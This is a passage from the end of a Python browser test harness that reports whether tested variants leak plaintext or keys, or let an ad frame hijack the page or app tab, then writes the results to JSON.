                         "key_leaked_via": [], "server_saw_key": False, "server_stored_plaintext": False}
                r["problems"] = judge(r, v)
                res["variants"].append(r)
                mark = "ok " if not r["problems"] else "BAD"
                failures += bool(r["problems"])
                print(f"[{mark}] {v.name:26} ran={str('ran' in r['tags_seen']):5} "
                      f"plain={','.join(r['plaintext_leaked_via']) or '-':34} key={','.join(r['key_leaked_via']) or '-':22} "
                      f"hijack(no-click/click)={r.get('top_hijacked_without_click')}/{r.get('top_hijacked_on_ad_click')}"
                      + (f"  opener_hijack={r.get('opener_hijacked_app_tab')}" if 'opener_hijacked_app_tab' in r else ""))
                for p in r["problems"]:
                    print("      !!", p)
                if r.get("harness_error"):
                    print("      !! harness:", r["harness_error"][:300])
            try:
                res["special"] = await asyncio.wait_for(run_special(browser), timeout=120) if not args.only else []
            except Exception as e:  # noqa: BLE001
                res["special"] = [{"check": "special", "ok": False, "error": f"{type(e).__name__}: {e}"}]
            for s in res["special"]:
                failures += not s.get("ok")
                print(f"[{'ok ' if s.get('ok') else 'BAD'}] {json.dumps(s, ensure_ascii=False)[:230]}")
            all_results["browsers"][bname] = res
            await browser.close()
    Path(args.out).write_text(json.dumps(all_results, ensure_ascii=False, indent=2), encoding="utf-8")
    print(f"\nresults: {args.out}\nfailures: {failures}")
    return 1 if failures else 0


if __name__ == "__main__":
    os.environ.setdefault("PYTHONDONTWRITEBYTECODE", "1")
    sys.exit(asyncio.run(main()))
